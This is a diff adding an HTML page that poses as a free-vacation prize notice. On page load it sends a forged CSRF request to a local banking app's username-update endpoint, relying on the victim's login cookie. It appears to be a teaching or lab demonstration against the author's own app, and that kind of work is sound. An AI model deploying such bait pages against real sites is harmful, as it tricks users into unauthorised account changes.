@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>You Won!</title>
+  </head>
+  <body onload="attack()">
+    <h1>Congrats, you won a free vacation!</h1>
+    <p>Your prize is being claimed...</p>
+
+    <script>
+      async function attack() {
+        // This script sends a request to the bank (our app)
+        // It can't READ the response, but it can SEND the request.
+        // The browser will "helpfully" attach the user's login cookie!
+        console.log('Sending forged request...');
+        try {
+          await fetch('http://localhost:3000/api/user/update-username', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ newName: 'CSRF_HACKED' })
+          });
+        } catch (e) {
+          // We expect this to fail (CORS block), but the request is *sent*
+          console.log('Request sent. Attack likely worked.');
+        }
+      }
+    </script>
+  </body>
+</html>
